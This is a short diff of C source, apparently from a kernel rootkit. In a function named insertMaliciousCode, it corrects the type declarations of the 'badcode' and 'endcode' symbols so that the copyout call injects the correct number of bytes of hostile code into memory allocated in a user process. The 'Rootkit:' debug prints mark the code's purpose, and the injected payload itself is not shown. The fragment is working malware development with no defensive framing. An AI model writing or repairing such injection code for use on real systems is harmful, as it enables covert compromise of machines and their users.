@@ -92,8 +92,8 @@ insertMaliciousCode (struct thread * td) {
   //
   // Install malicious code into the allocated memory.
   //
-  extern void * badcode;
-  extern void * endcode;
+  extern unsigned char badcode;
+  extern unsigned char endcode;
   printf ("Rootkit: 1: copyout: %p %p %lx\n", badcode, td->td_retval[0], &endcode - &badcode);
   error = copyout (&badcode, td->td_retval[0], &endcode - &badcode); 
   printf ("Rootkit: 2: copyout: %d: %p %p %lx\n", error, &badcode, td->td_retval[0], &endcode - &badcode);
